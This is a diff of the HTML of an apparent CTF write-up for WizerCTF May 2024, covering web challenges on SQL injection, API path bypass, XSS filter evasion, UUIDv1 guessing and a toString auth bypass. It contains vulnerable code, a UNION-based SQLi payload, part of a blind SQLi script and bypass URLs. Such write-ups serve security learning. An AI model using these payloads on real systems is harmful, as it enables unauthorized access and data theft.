@@ -23,12 +23,11 @@
   <meta name="twitter:title" content="WizerCTF-May2024">
   <meta name="twitter:description" content="Wizer CTF is an exciting game designed specifically for developers . It’s all about putting your skills to the test and seeing if you can identify and exploit vulnerabilities while honing your secure coding abilities. The game kicks off with a snappy code snippet that comes with some tricky vulnerabilities. Your goal? Spot those vulnerabilities and figure out how to exploit them. The cool thing is that you don’t have to rely on guesswork to know if you’ve got it right. You can actually execute your payload right there on the game page. If you manage to successfully exploit the vulnerabilities, you’ll earn yourself a flag and a well-deserved spot on leaderboard , The main focus area is web exploitation and the ctf event is held every quarter , this writeup discusses 5 challenges out of 6.">
       <meta name="twitter:site" content="@tinkerhell1337">
-<meta name="application-name" content="0xMesbaha">
-<meta name="apple-mobile-web-app-title" content="0xMesbaha">
-<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+<meta name="application-name" content="My cool site">
+<meta name="apple-mobile-web-app-title" content="My cool site"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hussienmisbah.github.io/posts/code-review/2024-05-06-wizerctf-may-2024/" /><link rel="prev" href="https://hussienmisbah.github.io/posts/web-exploitation/2023-06-04-justctf_extra-safe-security-layers/" /><link rel="next" href="https://hussienmisbah.github.io/posts/osint/2024-11-30-cyctf-finals-osint-writeups/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
-        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hussienmisbah.github.io/posts/code-review/2024-05-06-wizerctf-may-2024/" /><link rel="prev" href="https://hussienmisbah.github.io/posts/web-exploitation/2023-06-04-justctf_extra-safe-security-layers/" /><link rel="next" href="https://hussienmisbah.github.io/posts/osint/2024-11-30-cyctf-finals-osint-writeups/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
         <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
     {
         "@context": "http://schema.org",
@@ -47,18 +46,7 @@
             },"description": ""
     }
     </script></head>
-    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
-          const query = window.matchMedia('(prefers-color-scheme: dark)');
-          function applyTheme() {
-            let theme = window.localStorage?.getItem('theme') || 'dark';
-            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
-            document.body.setAttribute('theme', isDark? 'dark' : 'light');
-            document.body.setAttribute('cfg-theme', theme);
-          }
-
-          applyTheme();
-          query.addEventListener('change', applyTheme);
-        </script>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
 
         <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
     <div class="header-wrapper">
@@ -122,7 +110,7 @@
             <h2 class="toc-title">Contents</h2>
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">WizerCTF-May2024</h1><div class="post-meta">
-            <div class="post-meta-line">&nbsp;<span class="post-category">in <a href="/categories/code-review/">Code Review</a></span></div>
+            <div class="post-meta-line">&nbsp;<span class="post-category">in <a href="/categories/code-review/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Code Review</a></span></div>
             <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-05-05">2024-05-05</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2017 words&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;10 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
@@ -143,12 +131,7 @@
 The cool thing is that you don&rsquo;t have to rely on guesswork to know if you&rsquo;ve got it right. You can actually execute your payload right there on the game page. If you manage to successfully exploit the vulnerabilities, you&rsquo;ll earn yourself a flag and a well-deserved spot on leaderboard , The main focus area is web exploitation and the ctf event is held every quarter , this writeup discusses 5 challenges out of 6.</em></p>
 <h2 id="1--login-as-an-admin-sqli">1- Login as an Admin (SQLi)</h2>
 <p>The first challenge is a typicall sql injection challenge however it checks if the password we enter is the same returning from the table which makes it a bit tricky , also the name of admin was given &ldquo;fitzh&rdquo;</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-js">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">getUser</span> <span class="o">=</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">userName</span><span class="p">,</span> <span class="nx">password</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">getUser</span> <span class="o">=</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">userName</span><span class="p">,</span> <span class="nx">password</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">connection</span> <span class="o">=</span> <span class="nx">mysql</span><span class="p">.</span><span class="nx">createConnection</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">DATABASE_URL</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">query</span> <span class="o">=</span> <span class="sb">`SELECT userName, password, type, firstName, lastName FROM users_table
 </span></span></span><span class="line"><span class="cl"><span class="sb">                    WHERE userName = &#39;</span><span class="si">${</span><span class="nx">userName</span><span class="si">}</span><span class="sb">&#39; and password = &#39;</span><span class="si">${</span><span class="nx">password</span><span class="si">}</span><span class="sb">&#39;`</span><span class="p">;</span>
@@ -166,14 +149,9 @@ The cool thing is that you don&rsquo;t have to rely on guesswork to know if you&
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">    
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">[];</span>
-</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></div></div>
-<p>this challenge can be solved blind time based as following (time consuming , not smart , not intended)</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-python">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></div><p>this challenge can be solved blind time based as following (time consuming , not smart , not intended)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">
@@ -192,26 +170,16 @@ The cool thing is that you don&rsquo;t have to rely on guesswork to know if you&
 </span></span><span class="line"><span class="cl">            <span class="k">break</span> 
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span></span></span></code></pre></div></div>
-<p>Or it can be easily solved using the <code>AS</code> Alias as some people did during the CTF</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-json">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span> 
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span></code></pre></div><p>Or it can be easily solved using the <code>AS</code> Alias as some people did during the CTF</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span> 
 </span></span><span class="line"><span class="cl">      <span class="nt">&#34;user&#34;</span><span class="p">:</span> <span class="s2">&#34;fritzh&#39; UNION SELECT &#39;fritzh&#39;  as userName, &#39;\&#34; AND \\&#39;1\\&#39; = \\&#39;1&#39; as password, (SELECT password from users_table where username=&#39;fitzh&#39;) as type, &#39;&#39; as firstName, &#39;&#39; as lastName WHERE &#39;1&#39; = &#39;1&#39; OR &#39;1&#39; = \&#34; FROM  users_table&#34;</span><span class="p">,</span> 
 </span></span><span class="line"><span class="cl">      <span class="nt">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;\&#34; AND &#39;1&#39; = &#39;1&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
-<h2 id="2--augustus-gloops-secret-apis">2- Augustus Gloop&rsquo;s Secret (APIs)</h2>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h2 id="2--augustus-gloops-secret-apis">2- Augustus Gloop&rsquo;s Secret (APIs)</h2>
 <p>The challenge discusses a recent bypass technique that when an api is blacklisted like &ldquo;/admin&rdquo; , it can be called with &ldquo;/admin/&rdquo; and the check will be bypassed easily , but this time they blacklisted the <code>/</code> character , so we can find other way to add a character make it valid to request <code>/getuser</code> but also bypasses the check of <code>requireAuthentication</code></p>
 <p>There is a user id <code>:4dc6b6fa-963f-4c51-b100-d2c5def2498d</code> given to retrieve its data as a POC.</p>
-<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
-    <div class="code-header language-js">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nx">dotenv</span><span class="p">.</span><span class="nx">config</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">uuidFormat</span> <span class="o">=</span> <span class="sr">/^[0-9a-f]{8}-[0-9a-f]{4}-[0-5][0-9a-f]{3}-[089ab][0-9a-f]{3}-[0-9a-f]{12}$/i</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">requireAuthentication</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;getuser&#39;</span><span class="p">,</span> <span class="s1">&#39;getcompany&#39;</span><span class="p">];</span>
@@ -279,8 +247,8 @@ The cool thing is that you don&rsquo;t have to rely on guesswork to know if you&
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nx">app2</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/CRMEntities&#39;</span><span class="p">,</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">CRMEntities</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">})</span></span></span></code></pre></div></div>
-<p>adding the <code>?</code> will make the endpoint still valid to request then we can add the arguments needed and get the record we want</p>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span></code></pre></div><p>adding the <code>?</code> will make the endpoint still valid to request then we can add the arguments needed and get the record we want</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -291,12 +259,7 @@ The cool thing is that you don&rsquo;t have to rely on guesswork to know if you&
         title="image" /></p>
 <h2 id="3--hack-the-menu-xss">3- Hack the Menu (XSS)</h2>
 <p>The challenge is a clear open redirect challenge to trigger XSS via the javascript scheme , however the scheme is blocked in all cases as shown</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-javascript">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">React</span> <span class="nx">from</span> <span class="s1">&#39;react&#39;</span><span class="p">;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">React</span> <span class="nx">from</span> <span class="s1">&#39;react&#39;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">Image</span> <span class="nx">from</span> <span class="s1">&#39;next/image&#39;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">sanitizeLink</span> <span class="o">=</span> <span class="p">(</span><span class="nx">directLink</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
@@ -308,8 +271,8 @@ The cool thing is that you don&rsquo;t have to rely on guesswork to know if you&
 </span></span><span class="line"><span class="cl">    <span class="nx">directLink</span> <span class="o">=</span> <span class="nb">String</span><span class="p">(</span><span class="nx">directLink</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="nx">regEx</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="p">}</span>
 </span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">directLink</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
-<p>There are multiple ways to solve it by adding characters that still make the protocol valid and passes the check like <code>%09</code> , <code>%0A%0D</code> as shown</p>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>There are multiple ways to solve it by adding characters that still make the protocol valid and passes the check like <code>%09</code> , <code>%0A%0D</code> as shown</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -320,12 +283,7 @@ The cool thing is that you don&rsquo;t have to rely on guesswork to know if you&
         title="image" /></p>
 <h2 id="4--sensitive-flags-nodejs-uidv1">4- Sensitive Flags (Nodejs UIDv1)</h2>
 <p>The goal of the challenge is clear we want to issue a request to <code>/flag</code> with a valid username and a valid corresponding API_KEY , although it checks for authroization header we can still see the data at the redirect response (unsafe redirect) , and we can generate API_KEY for the admin account using <code>createAPIKey</code></p>
-<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
-    <div class="code-header language-javascript">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">secretKey</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">randomBytes</span><span class="p">(</span><span class="mi">64</span><span class="p">);</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">secretKey</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">randomBytes</span><span class="p">(</span><span class="mi">64</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">flags</span> <span class="o">=</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="s1">&#39;Belgium&#39;</span><span class="o">:</span> <span class="s1">&#39;black yellow red&#39;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">    <span class="s1">&#39;United States&#39;</span><span class="o">:</span> <span class="s1">&#39;red white blue&#39;</span><span class="p">,</span>
@@ -379,17 +337,12 @@ The cool thing is that you don&rsquo;t have to rely on guesswork to know if you&
 </span></span><span class="line"><span class="cl">        <span class="c1">// If the token is valid
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">result</span><span class="p">)</span> 
 </span></span><span class="line"><span class="cl">    <span class="p">});</span>
-</span></span><span class="line"><span class="cl"><span class="p">});</span></span></span></code></pre></div></div>
-<p>Using <code>uuid.v1()</code> is known to be unsecure as it calculates values based on the timestamp and mac address of the device , it is known to be vulnerable for the <a href="https://realizesec.com/blog/sandwich-attacks-exploiting-uuid-v1" target="_blank" rel="noopener noreffer ">sandwich attack</a> , the following lines are the most important ones , we can get the sample and right after it the admin API_KEY is set so we can get brute-force few ones after the sample we got to get the APIKey assigned to the admin</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-javascript">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">sample</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">(</span><span class="nx">uuid</span><span class="p">.</span><span class="nx">v1</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></div><p>Using <code>uuid.v1()</code> is known to be unsecure as it calculates values based on the timestamp and mac address of the device , it is known to be vulnerable for the <a href="https://realizesec.com/blog/sandwich-attacks-exploiting-uuid-v1" target="_blank" rel="noopener noreffer ">sandwich attack</a> , the following lines are the most important ones , we can get the sample and right after it the admin API_KEY is set so we can get brute-force few ones after the sample we got to get the APIKey assigned to the admin</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">sample</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">(</span><span class="nx">uuid</span><span class="p">.</span><span class="nx">v1</span><span class="p">());</span>
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">users</span><span class="p">[</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">username</span><span class="p">])</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">(</span><span class="s1">&#39;That user does not exist&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">users</span><span class="p">[</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">username</span><span class="p">][</span><span class="s1">&#39;APIKey&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">uuid</span><span class="p">.</span><span class="nx">v1</span><span class="p">();</span></span></span></code></pre></div></div>
-<p>Running the sample request multiple times to check the pattern we get only the first fragment is slightly changed</p>
+</span></span><span class="line"><span class="cl">    <span class="nx">users</span><span class="p">[</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">username</span><span class="p">][</span><span class="s1">&#39;APIKey&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">uuid</span><span class="p">.</span><span class="nx">v1</span><span class="p">();</span>
+</span></span></code></pre></div><p>Running the sample request multiple times to check the pattern we get only the first fragment is slightly changed</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -405,34 +358,19 @@ The cool thing is that you don&rsquo;t have to rely on guesswork to know if you&
 <li>brute-force the first fragment (maybe last 6 digits of the first fragment is enough)</li>
 </ul>
 <p>However , there is another unintended solution to bypass the checks as following (This solution was discussed in the ctf server after the event ended)</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-javascript">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">users</span><span class="p">[</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">username</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">apikey</span> <span class="o">===</span> <span class="nx">users</span><span class="p">[</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">username</span><span class="p">][</span><span class="s1">&#39;APIKey&#39;</span><span class="p">])</span> <span class="p">{</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">users</span><span class="p">[</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">username</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">apikey</span> <span class="o">===</span> <span class="nx">users</span><span class="p">[</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">username</span><span class="p">][</span><span class="s1">&#39;APIKey&#39;</span><span class="p">])</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="nx">result</span> <span class="o">=</span> <span class="nx">flags</span><span class="p">[</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">flag</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span></span></span></code></pre></div></div>
-<ul>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><ul>
 <li>As we control the <code>req.query.username</code> , if we pass the first check so it returns something but doesn&rsquo;t have an apikey</li>
 <li>In same time don&rsquo;t provide <code>apikey</code> parameter so we pass the if checks and get into the body</li>
 <li>we supply <code>?flag=FLAG</code> so we choose the flag from the list given</li>
 </ul>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><pre tabindex="0"><code>Function.prototype.toString()
-Returns a string representing the source code of the function. Overrides the Object.prototype.toString method.</code></pre></div>
-<p>To abuse the <code>req.query.username</code> we can supply <code>req.query.username[&quot;toString&quot;]</code> This returns a function and not undefined error message so first check in the <code>if</code> is passed , then don&rsquo;t provide apikey parameter so it will be undefined and as the username is not really valid will also return undefined from <code>users[req.query.username]['APIKey']</code> and pass all checks. then supply flag parameter , final payload :</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><pre tabindex="0"><code>/flag?username=toString&amp;flag=FLAG </code></pre></div>
-<p><img
+<pre tabindex="0"><code>Function.prototype.toString()
+Returns a string representing the source code of the function. Overrides the Object.prototype.toString method.
+</code></pre><p>To abuse the <code>req.query.username</code> we can supply <code>req.query.username[&quot;toString&quot;]</code> This returns a function and not undefined error message so first check in the <code>if</code> is passed , then don&rsquo;t provide apikey parameter so it will be undefined and as the username is not really valid will also return undefined from <code>users[req.query.username]['APIKey']</code> and pass all checks. then supply flag parameter , final payload :</p>
+<pre tabindex="0"><code>/flag?username=toString&amp;flag=FLAG 
+</code></pre><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="/assets/images/CTFs/wizerCTF2024/4_2.png"
@@ -448,12 +386,7 @@ Returns a string representing the source code of the function. Overrides the Obj
 <li>we can&rsquo;t get admin password or secret key directly</li>
 <li>there is an apk we can use as a client to send requests</li>
 </ul>
-<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
-    <div class="code-header language-javascript">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">users</span> <span class="o">=</span> <span class="p">{</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">users</span> <span class="o">=</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="s1">&#39;admin&#39;</span><span class="o">:</span> <span class="p">{</span> <span class="nx">id</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">username</span><span class="o">:</span> <span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="nx">password</span><span class="o">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">ADMIN_PASSWORD</span><span class="p">,</span> <span class="nx">flag</span><span class="o">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">FLAG</span> <span class="p">},</span>
 </span></span><span class="line"><span class="cl">    <span class="s1">&#39;user&#39;</span><span class="o">:</span> <span class="p">{</span> <span class="nx">id</span><span class="o">:</span> <span class="mi">2</span><span class="p">,</span> <span class="nx">username</span><span class="o">:</span> <span class="s1">&#39;user&#39;</span><span class="p">,</span> <span class="nx">password</span><span class="o">:</span> <span class="s1">&#39;password&#39;</span><span class="p">,</span> <span class="nx">flag</span><span class="o">:</span> <span class="s1">&#39;You don\&#39;t have a flag.&#39;</span> <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">};</span>
